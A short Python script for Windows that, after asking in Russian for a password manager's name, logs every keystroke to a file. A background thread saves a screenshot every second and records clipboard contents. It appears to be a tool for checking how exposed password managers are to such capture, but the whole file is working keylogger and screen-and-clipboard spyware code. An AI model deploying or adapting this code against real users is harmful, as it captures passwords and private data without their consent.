# import pyscreenshot
import win32clipboard
import pynput
import threading
import pynput
from pynput.keyboard import Key, Listener
import json
import pyautogui
import os
import time
import yaml

keys = []

mp_name = "password_manager"
keylogger_path = f"{mp_name}/keylogger.txt"
#buffer.txt
#images
  
def on_press(key):
    keys.append(key)
    #write_file(keys)
    key_s = ""
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        key_s = key.char 
    except AttributeError:
        print('special key {0} pressed'.format(key))
        key_s = key
    try:
        with open(keylogger_path, "a") as f:
            f.write(str(key_s))
    except:pass

def on_release(key):
    if(key=="q"):exit()
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

def GetScreen(name):
    im_folder = f"{mp_name}/images"
    if(not os.path.exists(im_folder)):os.mkdir(im_folder)
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(f'{im_folder}/{name}.png')

def GetBuffer():
    data = ""
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        # print(data)
    except:pass
    return data

def CheckState():
    i=70
    buffer_path = f"{mp_name}/buffer.txt"
    while(1):
        GetScreen(str(i))
        i+=1
        s = GetBuffer()
        print("buffer", s)
        try:
            with open(buffer_path, "a") as f:
                f.write(s+"\n")
        except:pass
        time.sleep(1)

def main():
    global mp_name
    global keylogger_path
    print("staring")

    mp_name = input("Введите название менеджера паролей: ")
    if(not os.path.exists(mp_name)):os.mkdir(mp_name)

    thread = threading.Thread(target=CheckState)
    thread.setDaemon(True)
    thread.start()

    # thread = threading.Thread(target=CheckState)
    # thread.setDaemon(True)
    # thread.start()

    keylogger_path = f"{mp_name}/keylogger.txt"

    with Listener(on_press = on_press, on_release = on_release) as listener:             
        listener.join()

    while(1):
        time.sleep(10)



if __name__ == "__main__":
    main()
